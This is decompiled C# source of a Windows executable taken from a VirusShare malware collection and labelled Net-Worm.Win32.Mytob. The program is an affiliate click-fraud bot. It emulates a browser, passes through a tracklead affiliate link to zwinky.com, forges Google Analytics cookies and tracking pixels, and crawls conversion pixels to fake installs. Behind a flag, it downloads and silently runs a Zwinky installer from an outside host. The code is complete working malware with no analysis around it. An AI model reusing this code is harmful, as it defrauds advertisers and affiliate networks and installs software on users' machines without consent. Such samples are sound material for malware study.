// Decompiled with JetBrains decompiler
// Type: AffiliateExecuterNoWin.Program
// Assembly: AffbDown, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B2C8CE0B-1BE0-495D-A802-96F8B12DDDC1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Net-Worm.Win32.Mytob.lcl-d1b165dbe476d86c2314ff4b08e46e2a0060d1b5ddd5c810717d03b27bcc4b07.exe

using HTTPAgent;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace AffiliateExecuterNoWin
{
  internal static class Program
  {
    private static string trackerUrlAndVersion;

    [STAThread]
    private static void Main(string[] args)
    {
      string str1 = "http://disguiseyou.info/cartoon";
      string appName = "ddl11110";
      bool flag1 = false;
      string URL = "http://lookforpages.com/checkip/index.php";
      bool flag2 = false;
      string str2 = "ZwinkySetup2.3.67.1.SA.HP.ZJfox000.exe";
      string url1 = "http://ak.exe.imgfarm.com/images/nocache/funwebproducts/2.3.67.1/" + str2;
      Program.trackerUrlAndVersion = "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1";
      if (new DateTime(3000, 1, 1) < DateTime.Now)
        return;
      Agent agent = new Agent();
      agent.EmulateBrowser();
      if (flag1)
      {
        string data = DataExtractor.ExtractDataArray(agent.GetURL(URL), "(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b)", "$1")[0];
        string savedIps = Program.GetSavedIPs(appName);
        if (savedIps.IndexOf(data) >= 0)
          return;
        Program.SetSavedIPs(appName, savedIps + data + ";");
      }
      agent.Referer = str1;
      string url2 = agent.GetURL("http://www.tracklead.net/click.track?CID=147147&AFID=116671&ADID=438207&SID=");
      string referer = agent.Referer;
      if (!referer.StartsWith("http://www.zwinky.com"))
        return;
      string data1 = DataExtractor.ExtractDataArray(url2, "splash/partner/([^\"']+)", "$1")[0];
      Program.addTrackingCookies(agent.cookieJar, "zwinky.com");
      Program.GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=1330832168&utmsr=1024x600&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmcn=1&utmdt=Zwinky%20Download&utmhn=www.zwinky.com&utmr=-&utmp=[URL]", "[URL]", referer.Replace("http://www.zwinky.com", ""));
      Program.GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=1604407018&utmsr=1024x600&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Zwinky%20Download&utmhn=www.zwinky.com&utmp=/clicks/splash/cookie_enabled", (string) null, (string) null);
      Program.GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=1093927009&utmsr=1024x600&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Zwinky%20Download&utmhn=www.zwinky.com&utmp=/clicks/splash/partner/[partnerID]", "[partnerID]", data1);
      agent.GetURL("http://www.zwinky.com/dl/install.jhtml");
      Program.GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=343424887&utmsr=1024x600&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Zwinky%20Download&utmhn=www.zwinky.com&utmr=-&utmp=/dl/install.jhtml", (string) null, (string) null);
      Program.GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=2138667430&utmsr=1024x600&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Zwinky%20Download&utmhn=www.zwinky.com&utmp=/clicks/splash/install_ie_sp2_progress", (string) null, (string) null);
      string userAgent = agent.UserAgent;
      agent.UserAgent = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 3.0)";
      string url3 = agent.GetURL("http://www.zwinky.com/dl/success.jhtml");
      agent.UserAgent = userAgent;
      string data2 = DataExtractor.ExtractDataArray(url3, "<script src=\"([^\"]+)", "$1")[0];
      agent.GetURL(data2);
      if (flag2)
      {
        if (Directory.Exists("C:\\Users\\Public\\Documents\\"))
          str2 = "C:\\Users\\Public\\Documents\\" + str2;
        agent.getURL2File(url1, str2);
        try
        {
          Process.Start(str2).WaitForExit();
          System.IO.File.Delete(str2);
        }
        catch
        {
        }
      }
      Program.GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=438546798&utmsr=1024x600&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Success&utmhn=www.zwinky.com&utmr=-&utmp=/dl/success.jhtml", (string) null, (string) null);
      string url4 = agent.GetURL("http://www.zwinky.com/dl/successPixels.jhtml");
      Program.GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=29081666&utmsr=1024x600&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Success&utmhn=www.zwinky.com&utmp=/clicks/settings/checkboxes/sa2_on/hp_on", (string) null, (string) null);
      Program.GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=1506977564&utmsr=1024x600&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Success&utmhn=www.zwinky.com&utmp=/clicks/bartools/download_complete", (string) null, (string) null);
      Program.GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=1693689420&utmsr=1024x600&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Success&utmhn=www.zwinky.com&utmp=/clicks/settings/active_x/[RANDOMID]", "[RANDOMID]", "u%253D" + Program.randomString(22) + "%2526p%253D" + data1);
      Program.GetRecursivePixels(agent, url4);
    }

    private static void GetRecursivePixels(Agent agent, string html)
    {
      html = Regex.Replace(html, "<noscript>.*?</noscript>", "");
      List<string> stringList = new List<string>();
      stringList.AddRange((IEnumerable<string>) DataExtractor.ExtractDataArray(html, "pt src=\" ?([^\"]+)", "$1"));
      stringList.AddRange((IEnumerable<string>) DataExtractor.ExtractDataArray(html, "<SCRIPT language=\"javascript\" src=\" ?([^\"]+)", "$1"));
      stringList.AddRange((IEnumerable<string>) DataExtractor.ExtractDataArray(html, "<img src=\\\\?\" ?([^\"\\\\]+)", "$1"));
      stringList.AddRange((IEnumerable<string>) DataExtractor.ExtractDataArray(html, "<iframe[^>]+?src=[\"']([^\"']+)", "$1"));
      string cid = Program.FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var google_conversion_id *= *([0-9]+)", "$1"));
      if (cid != "")
      {
        string clang = Program.FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var google_conversion_language\\s*=\\s*\"([^\"]+)", "$1"));
        string cformat = Program.FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var google_conversion_format\\s*=\\s*\"([^\"]+)", "$1"));
        string ccolor = Program.FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var google_conversion_color\\s*=\\s*\"([^\"]+)", "$1"));
        string clabel = Program.FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var google_conversion_label\\s*=\\s*\"([^\"]+)", "$1"));
        stringList.Add(Program.createGoogleAdServicesURL(cid, clang, cformat, ccolor, clabel));
      }
      string offerID = Program.FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var filitrac_offer_id\\s*=\\s*'([^']+)", "$1"));
      string referece = Program.FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var filitrac_reference\\s*=\\s*'([^']+)", "$1"));
      if (offerID != "")
        stringList.Add(Program.createFilitracURL(offerID, referece));
      string referer = agent.Referer;
      foreach (string str in stringList)
      {
        agent.Referer = referer;
        string url = agent.GetURL(str.Trim().Replace("&amp;", "&"));
        Program.GetRecursivePixels(agent, url);
      }
    }

    private static string randomString(int len)
    {
      string str1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      Random random = new Random();
      string str2 = "";
      for (int index = 0; index < len; ++index)
        str2 += (string) (object) str1[random.Next(str1.Length)];
      return str2;
    }

    private static string GetSavedIPs(string appName)
    {
      string savedIps = ";";
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\" + appName, false);
        if (registryKey != null)
          savedIps = registryKey.GetValue("ips").ToString();
      }
      catch
      {
      }
      return savedIps;
    }

    private static void SetSavedIPs(string appName, string val)
    {
      try
      {
        (Registry.CurrentUser.OpenSubKey("SOFTWARE\\" + appName, true) ?? Registry.CurrentUser.CreateSubKey("SOFTWARE\\" + appName)).SetValue("ips", (object) val);
      }
      catch
      {
      }
    }

    public static void addTrackingCookies(CookieContainer cookies, string domain)
    {
      Random random = new Random();
      Uri uri = new Uri("http://" + domain + "/");
      long totalSeconds = (long) (DateTime.Now.ToUniversalTime() - new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalSeconds;
      string str1 = Program.uHash(domain);
      string str2 = str1 + "." + (object) random.Next(int.MaxValue) + "." + (object) totalSeconds + "." + (object) totalSeconds + "." + (object) totalSeconds + ".1";
      string str3 = str1 + "." + (object) totalSeconds + ".1.1.utmcsr=ZJxdm380|utmccn=(not+set)|utmcmd=(not+set)";
      cookies.Add(uri, Program.createCookie("__utma", str2, 1800));
      cookies.Add(uri, Program.createCookie("__utmb", str1, 1800));
      cookies.Add(uri, Program.createCookie("__utmc", str1, 1800));
      cookies.Add(uri, Program.createCookie("__utmz", str3, 1800));
    }

    public static string uHash(string d)
    {
      int num1 = 0;
      for (int startIndex = d.Length - 1; startIndex >= 0; --startIndex)
      {
        int num2 = (int) char.Parse(d.Substring(startIndex, 1));
        num1 = (num1 << 6 & 268435455) + num2 + (num2 << 14);
        int num3;
        if ((num3 = num1 & 266338304) != 0)
          num1 ^= num3 >> 21;
      }
      return num1.ToString();
    }

    public static Cookie createCookie(string name, string value, int timeout) => new Cookie(name, value)
    {
      Expires = DateTime.Now.AddSeconds((double) timeout)
    };

    public static string GetTrackingUrlByTemplate(
      Agent agent,
      string url,
      string trackingSearch,
      string trackingReplace)
    {
      string URL = Program.createTrackingUrl(Program.FirstOrEmpty(DataExtractor.ExtractDataArray(url, "&utmdt=([^&]*)", "$1")), Program.FirstOrEmpty(DataExtractor.ExtractDataArray(url, "&utmhn=([^&]*)", "$1")), Program.FirstOrEmpty(DataExtractor.ExtractDataArray(url, "&utmr=([^&]*)", "$1")), Program.FirstOrEmpty(DataExtractor.ExtractDataArray(url, "&utmp=(.*)", "$1")), !(Program.FirstOrEmpty(DataExtractor.ExtractDataArray(url, "(&utmcn=1)", "$1")) == ""));
      if (!string.IsNullOrEmpty(trackingSearch) || !string.IsNullOrEmpty(trackingReplace))
        URL = URL.Replace(trackingSearch, trackingReplace);
      return agent.GetURL(URL);
    }

    public static string FirstOrEmpty(string[] arr) => arr.Length > 0 ? arr[0] : "";

    public static string GetTrackingUrl(
      Agent agent,
      string title,
      string hostname,
      string referer,
      string tracking,
      bool addutmcn)
    {
      return agent.GetURL(Program.createTrackingUrl(title, hostname, referer, tracking, addutmcn));
    }

    public static string createTrackingUrl(
      string title,
      string hostname,
      string referer,
      string tracking,
      bool addutmcn)
    {
      Random random = new Random();
      string str = Screen.PrimaryScreen.Bounds.Width.ToString() + "x" + (object) Screen.PrimaryScreen.Bounds.Height;
      return Program.trackerUrlAndVersion + "&utmn=" + (object) random.Next(int.MaxValue) + "&utmsr=" + str + "&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0" + (addutmcn ? (object) "&utmcn=1" : (object) "") + (title == "" ? (object) "" : (object) ("&utmdt=" + title)) + "&utmhn=" + hostname + (referer == "" ? (object) "" : (object) ("&utmr=" + referer)) + "&utmp=" + tracking;
    }

    private static string createFilitracURL(string offerID, string referece) => "http://www.filitrac.com/Lead.aspx?pid=" + offerID + "&ref=" + referece + "&iframe=1";

    private static string createGoogleAdServicesURL(
      string cid,
      string clang,
      string cformat,
      string ccolor,
      string clabel)
    {
      long num = 1000L * (long) (DateTime.Now.ToUniversalTime() - new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalSeconds + (long) new Random().Next(1000);
      string[] strArray = clang.Split('_');
      string str1 = strArray[0];
      string str2 = strArray.Length <= 1 ? "" : strArray[1];
      TimeSpan timeSpan = DateTime.Now - DateTime.UtcNow;
      return "http://www.googleadservices.com/pagead/conversion/" + cid + "/?random=" + (object) num + "&cv=6&fst=" + (object) num + "&num=1&fmt=" + cformat + "&label=" + clabel + "&bg=" + ccolor + "&hl=" + str1 + "&gl=" + str2 + "&guid=ON&u_h=" + (object) Screen.PrimaryScreen.Bounds.Height + "&u_w=" + (object) Screen.PrimaryScreen.Bounds.Width + "&u_ah=" + (object) (Screen.PrimaryScreen.Bounds.Height - 30) + "&u_aw=" + (object) Screen.PrimaryScreen.Bounds.Width + "&u_cd=32&u_his=2&u_tz=" + (object) (int) (DateTime.Now - DateTime.UtcNow).TotalMinutes + "&u_nplug=0&u_nmime=0&url=http%3A//www.zwinky.com/dl/successPixels.jhtml";
    }
  }
}
